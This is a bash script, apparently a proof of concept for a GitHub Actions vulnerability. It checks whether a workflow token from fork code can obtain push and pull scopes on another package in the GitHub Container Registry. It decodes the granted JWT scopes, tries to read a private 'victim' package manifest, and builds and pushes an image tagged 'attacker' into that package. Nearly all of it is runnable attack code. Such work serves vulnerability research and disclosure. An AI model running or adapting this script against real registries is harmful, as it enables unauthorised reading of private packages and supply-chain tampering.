#!/usr/bin/env bash
# Cross-repo GHCR scope arm. Prints ONLY scopes/statuses/digests - never a token, never a secret value.
set -uo pipefail
if [ -z "${GITHUB_TOKEN:-}" ]; then
  echo "PKGX|VOID|GITHUB_TOKEN-EMPTY-IN-ENV - every result below is meaningless"
  echo "PKGX|DONE"; exit 0
fi
echo "PKGX|EVENT|${GITHUB_EVENT_NAME:-?}|REF|${GITHUB_REF:-?}|RUN|${GITHUB_RUN_ID:-?}"

# What the registry GRANTS, per {credential} x {target}. The `access` claim is the measurement.
scope_probe () {  # $1=label $2=scope-string $3=authmode(tok|anon)
  local label="$1" scope="$2" mode="$3" out code body acc
  if [ "$mode" = "tok" ]; then
    out=$(curl -s -o /tmp/b -w '%{http_code}' -u "x:${GITHUB_TOKEN}" \
          "https://ghcr.io/token?service=ghcr.io&scope=${scope}")
  else
    out=$(curl -s -o /tmp/b -w '%{http_code}' "https://ghcr.io/token?service=ghcr.io&scope=${scope}")
  fi
  code="$out"; body=$(cat /tmp/b)
  if [ "$code" = "200" ]; then
    # decode the JWT payload's access claim; base64url, pad it
    local p; p=$(echo "$body" | jq -r '.token' | cut -d. -f2)
    p="${p//-/+}"; p="${p//_//}"
    while [ $(( ${#p} % 4 )) -ne 0 ]; do p="${p}="; done
    acc=$(echo "$p" | base64 -d 2>/dev/null | jq -c '.access' 2>/dev/null)
    echo "PKGX|SCOPE|${label}|${mode}|http=${code}|granted=${acc}"
  else
    echo "PKGX|SCOPE|${label}|${mode}|http=${code}|body=$(echo "$body" | head -c 200 | tr -d '\n')"
  fi
}
OWN="repository:kovac-labs/zz-mq-tok-1027:push,pull"
VIC="repository:kovac-labs/zz-victim-pkg-1027:push,pull"
VICP="repository:kovac-labs/zz-victim-pkg-1027:pull"
GHOST="repository:kovac-labs/zz-no-such-package-1027:push,pull"
scope_probe OWN-PACKAGE-positive-control "$OWN"  tok
scope_probe VICTIM-PRIVATE-push-pull     "$VIC"  tok
scope_probe VICTIM-PRIVATE-pull-only     "$VICP" tok
scope_probe GHOST-nonexistent-in-org     "$GHOST" tok
scope_probe VICTIM-PRIVATE-push-pull     "$VIC"  anon   # capability diff vs ANONYMOUS

# Can we READ the victim's private manifest? (confidentiality leg)
TOK=$(curl -s -u "x:${GITHUB_TOKEN}" "https://ghcr.io/token?service=ghcr.io&scope=${VICP}" | jq -r '.token')
H=$(curl -s -o /tmp/m -w '%{http_code}' -H "Authorization: Bearer ${TOK}" \
   -H 'Accept: application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json' \
   https://ghcr.io/v2/kovac-labs/zz-victim-pkg-1027/manifests/v1)
echo "PKGX|VICTIM-MANIFEST-READ|http=${H}|sha256=$(sha256sum /tmp/m | cut -d' ' -f1)|bytes=$(wc -c </tmp/m)"
echo "PKGX|VICTIM-MANIFEST-BODY|$(head -c 300 /tmp/m | tr -d '\n')"
A=$(curl -s -o /tmp/ma -w '%{http_code}' \
   -H 'Accept: application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json' \
   https://ghcr.io/v2/kovac-labs/zz-victim-pkg-1027/manifests/v1)
echo "PKGX|VICTIM-MANIFEST-READ-ANON|http=${A}|bytes=$(wc -c </tmp/ma)"

# Can we WRITE a tag into the victim's private package? (integrity / supply-chain leg)
echo "${GITHUB_TOKEN}" | docker login ghcr.io -u x --password-stdin && echo "PKGX|DOCKER-LOGIN|OK"
mkdir -p /tmp/img && cd /tmp/img
printf 'FROM scratch\nCOPY f /f\n' > Dockerfile
echo "ATTACKER CONTENT pushed from ${GITHUB_EVENT_NAME} run ${GITHUB_RUN_ID} by unreviewed fork code" > f
T="ghcr.io/kovac-labs/zz-victim-pkg-1027:attacker-${GITHUB_RUN_ID}"
docker build -q -t "$T" . && echo "PKGX|BUILD|OK"
if docker push "$T" > /tmp/push.log 2>&1; then
  echo "PKGX|VICTIM-PUSH|SUCCEEDED|tag=attacker-${GITHUB_RUN_ID}"
  grep -Eo 'digest: sha256:[0-9a-f]+' /tmp/push.log | head -1 | sed 's/^/PKGX|VICTIM-PUSH-DIGEST|/'
else
  echo "PKGX|VICTIM-PUSH|REFUSED|$(tail -3 /tmp/push.log | tr -d '\n' | head -c 300)"
fi
echo "PKGX|DONE"
